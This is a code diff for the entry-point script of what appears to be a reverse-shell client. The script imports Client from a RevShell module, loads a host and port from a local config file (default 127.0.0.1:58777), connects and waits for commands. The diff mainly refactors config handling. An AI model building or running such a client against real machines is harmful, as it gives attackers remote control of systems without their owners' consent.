@@ -1,12 +1,17 @@
 from RevShell import Client
-import json, os.path
+import json, os.path, base64
 
 if __name__ == '__main__':
-    if not os.path.isfile('config.json'):
-        config = open('config.json', 'w')
-        config.write(json.dumps({'host': '127.0.0.1', 'port': 58777}, sort_keys = True))
 
-    server = json.loads(open('config.json', 'r').read())
+    PREFS = 'config.ini'
+    DEFAULT = {'host': '127.0.0.1', 'port': 58777}
+    
+    if not os.path.exists(PREFS):     
+        config = open(PREFS, 'w')
+        config.write(json.dumps(DEFAULT, sort_keys = True))
+        config.close()
+
+    server = json.loads(open(PREFS, 'r').read())
     client = Client(server['host'], server['port'])
     client.connect()
     client.receive()
